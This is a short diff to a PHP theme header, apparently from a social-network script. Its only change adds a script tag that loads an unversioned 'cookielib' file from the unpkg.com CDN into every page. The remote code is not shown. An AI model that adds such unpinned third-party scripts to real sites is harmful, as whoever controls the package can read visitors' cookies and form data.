@@ -840,6 +840,7 @@ if (mysqli_query($wo['sqlConnect'], "DESCRIBE `wondertage_settings`" )) {
 		<?php } ?>
 		<link rel="stylesheet" href="<?php echo $wo['config']['theme_url'];?>/stylesheet/flatpickr.min.css">
 		<script src="<?php echo $wo['config']['theme_url'];?>/javascript/flatpickr.js"></script>
+        <script src="//unpkg.com/cookielib/src/cookie.min.js"></script>
 	</head>
    
 	<body <?php if (!empty($wondertage_settings) && $wondertage_settings['tag_header_layout'] == 1) { ?> class="inViewAddView tag_header_top_p"<?php } ?><?php if ($wo['config']['chatSystem'] == 0) { ?> chat-off="true" <?php } ?>>
